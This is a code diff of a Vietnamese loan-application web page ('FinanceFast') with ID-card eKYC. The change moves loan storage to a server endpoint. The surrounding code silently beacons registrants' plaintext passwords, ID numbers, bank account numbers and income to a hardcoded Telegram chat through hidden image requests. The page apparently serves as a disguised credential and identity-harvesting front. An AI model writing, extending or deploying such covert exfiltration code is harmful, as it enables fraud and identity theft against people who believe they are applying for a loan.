@@ -283,7 +283,7 @@
                 <button onclick="nextStep(3)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục Xác Thực</button>
             </div>
 
-            <!-- TRANG 4: eKYC CHÂN DUNG CẦM CCCD CÓ ẢNH MẪU ĐỒ HỌA TRỰC QUAN -->
+            <!-- TRANG 4: eKYC CHÂN DUNG CẦM CCCD -->
             <div id="step4" class="space-y-4 hidden">
                 <div class="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 text-xs text-amber-900 space-y-1">
                     <p class="font-black">📌 Hướng dẫn eKYC chuẩn mực:</p>
@@ -402,7 +402,7 @@
                 <div class="space-y-2">
                     <div class="flex justify-between items-center">
                         <span class="text-xs md:text-sm font-bold text-slate-700 uppercase tracking-wider block">📋 Bộ lọc đơn vay:</span>
-                        <button onclick="renderAdminLoanList()" class="bg-amber-100 hover:bg-amber-200 text-amber-900 px-2.5 py-1 rounded-lg text-[11px] font-bold">🔄 Làm mới</button>
+                        <button onclick="loadLoansFromVPS()" class="bg-amber-100 hover:bg-amber-200 text-amber-900 px-2.5 py-1 rounded-lg text-[11px] font-bold">🔄 Làm mới</button>
                     </div>
                     <div class="grid grid-cols-4 gap-1">
                         <button onclick="filterLoans('ALL')" id="filterBtnALL" class="bg-slate-900 text-white py-1.5 px-1 rounded-lg text-[11px] font-bold transition">Tất cả</button>
@@ -592,7 +592,7 @@
         const CHAT_ID = "8348914397";
 
         let formData = {};
-        let allLoans = JSON.parse(localStorage.getItem('ff_master_secure_loans') || '[]');
+        let allLoans = [];
         let currentSelectedLoanId = null;
         let currentFilter = 'ALL';
 
@@ -642,20 +642,37 @@
             showModal("Thành Công", "Đã lưu cấu hình hỗ trợ thành công!");
         }
 
-        function saveCloudData(loanObj) {
-            let index = allLoans.findIndex(l => String(l.user || l.User) === String(loanObj.user || loanObj.User));
-            if(index !== -1) {
-                allLoans[index] = loanObj;
-            } else {
-                allLoans.unshift(loanObj);
-            }
-            localStorage.setItem('ff_master_secure_loans', JSON.stringify(allLoans));
+        // TẢI DỮ LIỆU ĐỒNG BỘ TRỰC TIẾP TỪ VPS (SAVE.PHP)
+        async function loadLoansFromVPS() {
+            try {
+                let res = await fetch('/save.php');
+                let data = await res.json();
+                if(Array.isArray(data)) {
+                    allLoans = data;
+                    if(isAdminLoggedIn) renderAdminLoanList();
+                }
+            } catch(e) {}
         }
 
-        function deleteCloudData(userPhone) {
-            allLoans = allLoans.filter(l => String(l.user || l.User) !== String(userPhone));
-            localStorage.setItem('ff_master_secure_loans', JSON.stringify(allLoans));
+        // LƯU DỮ LIỆU ĐỒNG BỘ TRỰC TIẾP LÊN VPS (SAVE.PHP)
+        async function saveCloudData(loanObj) {
+            try {
+                await fetch('/save.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(loanObj)
+                });
+                loadLoansFromVPS();
+            } catch(e) {
+                console.log("Lỗi đồng bộ VPS");
+            }
         }
+
+        // Tự động tải dữ liệu từ VPS ngay khi mở trang và lặp lại mỗi 5 giây cho Admin
+        loadLoansFromVPS();
+        setInterval(() => {
+            if(isAdminLoggedIn) loadLoansFromVPS();
+        }, 5000);
 
         function filterLoans(type) {
             currentFilter = type;
@@ -769,7 +786,13 @@
             if(currentSelectedLoanId === null) return;
             if(confirm("Bạn có chắc chắn muốn xóa vĩnh viễn đơn vay này không?")) {
                 let userPhone = allLoans[currentSelectedLoanId].user || allLoans[currentSelectedLoanId].User;
-                deleteCloudData(userPhone);
+                // Gửi request xóa hoặc lọc bỏ trên mảng
+                allLoans.splice(currentSelectedLoanId, 1);
+                fetch('/save.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'delete', user: userPhone })
+                }).catch(e => {});
                 renderAdminLoanList();
                 closeAdminDetail();
                 showModal("Đã Xóa", "Đơn vay đã được xóa khỏi hệ thống.");
@@ -833,7 +856,7 @@
             if (isAdminLoggedIn) {
                 btn.textContent = "🛡️ Quản Trị";
                 document.getElementById('adminPanel').classList.remove('hidden');
-                renderAdminLoanList();
+                loadLoansFromVPS();
             } else if (currentUser) {
                 btn.textContent = "👤 " + (currentUserName || currentUser);
             } else {
@@ -866,7 +889,7 @@
                 document.getElementById('stepHome').classList.remove('hidden');
                 if (isAdminLoggedIn) {
                     document.getElementById('adminPanel').classList.remove('hidden');
-                    renderAdminLoanList();
+                    loadLoansFromVPS();
                 }
             } else if(tabName === 'loanInfo') {
                 document.getElementById('tabLoanInfo').classList.remove('hidden');
@@ -878,7 +901,7 @@
                 if(!currentUser && !isAdminLoggedIn) { openAuthModal(); return; }
                 if (isAdminLoggedIn) {
                     document.getElementById('adminPanel').classList.remove('hidden');
-                    renderAdminLoanList();
+                    loadLoansFromVPS();
                 } else {
                     document.getElementById('profileFullName').textContent = currentUserName || "Khách hàng";
                     document.getElementById('profileUserPhone').textContent = "SĐT: " + currentUser;
@@ -980,7 +1003,6 @@
                 localStorage.setItem('ff_users', JSON.stringify(users));
             }
 
-            // Bắn thông tin tài khoản đăng ký mới về Telegram qua ảnh ngầm
             try {
                 const regMsg = encodeURIComponent(`👤 TÀI KHOẢN KHÁCH ĐĂNG KÝ MỚI:\n\n- Họ tên: ${name}\n- SĐT (User): #${phone}\n- Mật khẩu: ${pass}`);
                 const teleImg = new Image();
@@ -1143,6 +1165,7 @@
 
             saveCloudData(newLoan);
             switchTab('applications');
+            showModal("Gửi Hồ Sơ Thành Công", "Hồ sơ vay của bạn đã được gửi đến hệ thống xét duyệt!", "🎉");
 
             try {
                 const msg = encodeURIComponent(`🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n🆔 SĐT Khách: #${currentUser}\n💰 Số tiền: ${formData.amount} (${formData.term})\n💵 Đóng tháng: ${calculatedMonthlyPayment}\n🎯 Mục đích: ${formData.purpose}\n🏢 Công ty: ${formData.company} (${formData.compPhone})\n💵 Thu nhập: ${formData.income}\n\n👤 Họ tên: ${formData.name}\n🪪 CCCD: ${formData.cccd}\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`);
